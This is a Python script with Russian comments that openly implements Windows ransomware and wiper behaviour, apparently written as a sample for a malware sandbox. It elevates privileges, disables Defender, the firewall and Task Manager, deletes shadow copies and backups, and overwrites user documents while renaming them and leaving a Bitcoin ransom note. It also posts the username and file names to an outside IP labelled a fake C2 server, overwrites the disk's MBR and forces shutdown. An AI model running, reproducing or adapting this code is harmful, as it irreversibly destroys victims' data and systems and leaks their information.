import os
import sys
import time
import ctypes
import random
import string
import threading
import subprocess
import urllib.request
import urllib.parse
import base64
import shutil

# ==========================================
# ЧАСТЬ 1: ПРОВЕРКА ПРАВ И ЗАЩИТА
# ==========================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# ==========================================
# ЧАСТЬ 2: ОБХОД ЗАЩИТЫ (DEFENSE EVASION)
# ==========================================

def bypass_defense():
    # Отключаем Защитник
    subprocess.run("powershell -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Отключаем Брандмауэр
    subprocess.run("netsh advfirewall set allprofiles state off", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Отключаем Диспетчер задач
    subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ==========================================
# ЧАСТЬ 3: УНИЧТОЖЕНИЕ БЭКАПОВ (RANSOMWARE PREP)
# ==========================================

def destroy_backups():
    # Удаляем теневые копии
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Отключаем восстановление
    subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Удаляем каталог бэкапов
    subprocess.run("wbadmin delete catalog -quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ==========================================
# ЧАСТЬ 4: ШИФРОВАНИЕ ФАЙЛОВ (RANSOMWARE)
# ==========================================

def encrypt_files():
    target_dirs = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Pictures")
    ]
    
    for target_dir in target_dirs:
        if not os.path.exists(target_dir):
            continue
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    # Кодируем в Base64 (имитация шифрования)
                    encoded = base64.b64encode(data)
                    with open(file_path, "wb") as f:
                        f.write(b"ENCRYPTED_BY_WIRDOL_" + encoded[:200])
                    os.rename(file_path, file_path + ".WIRDOL_LOCKED")
                except:
                    pass

    # Оставляем записку на рабочем столе
    note_path = os.path.expanduser("~\\Desktop\\README_WIRDOL.txt")
    try:
        with open(note_path, "w", encoding="utf-8") as note:
            note.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
            note.write("SEND 1 BITCOIN TO: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
            note.write("YOUR ID: " + "".join(random.choices(string.ascii_uppercase, k=10)))
    except:
        pass

# ==========================================
# ЧАСТЬ 5: КРАЖА ДАННЫХ И ОТПРАВКА (C2 / EXFILTRATION)
# ==========================================

def steal_and_send():
    stolen_data = ""
    # Собираем имена файлов и системную инфу
    stolen_data += f"User: {os.getenv('USERNAME')}\n"
    stolen_data += f"Computer: {os.getenv('COMPUTERNAME')}\n"
    
    for target_dir in [os.path.expanduser("~\\Documents")]:
        if os.path.exists(target_dir):
            for file in os.listdir(target_dir)[:10]: # Берем только первые 10 файлов
                stolen_data += f"Stolen file: {file}\n"

    # Отправляем на фейковый C2 сервер (Triage зафиксирует сеть)
    try:
        data = urllib.parse.urlencode({"data": stolen_data}).encode("utf-8")
        req = urllib.request.Request("http://185.220.101.5/upload.php", data=data)
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# ==========================================
# ЧАСТЬ 6: СНОС MBR (BOOTKIT)
# ==========================================

def destroy_mbr():
    mbr_code = """
using System;
using System.IO;
using System.Runtime.InteropServices;
public class MBR {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Destroy() {
        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero) return;
        byte[] garbage = new byte[512];
        new Random().NextBytes(garbage);
        uint bytesWritten;
        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
        CloseHandle(hDevice);
    }
}
"""
    try:
        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ГЛАВНЫЙ ЦИКЛ
# ==========================================

def main():
    if not is_admin():
        run_as_admin()
        return

    # Запускаем всё в фоне
    threading.Thread(target=bypass_defense, daemon=True).start()
    threading.Thread(target=destroy_backups, daemon=True).start()
    threading.Thread(target=steal_and_send, daemon=True).start()
    
    # Шифруем файлы (занимает время)
    encrypt_files()
    
    # Ломаем MBR
    destroy_mbr()
    
    # Вырубаем систему
    os.system("shutdown /s /f /t 0")

if __name__ == "__main__":
    main()
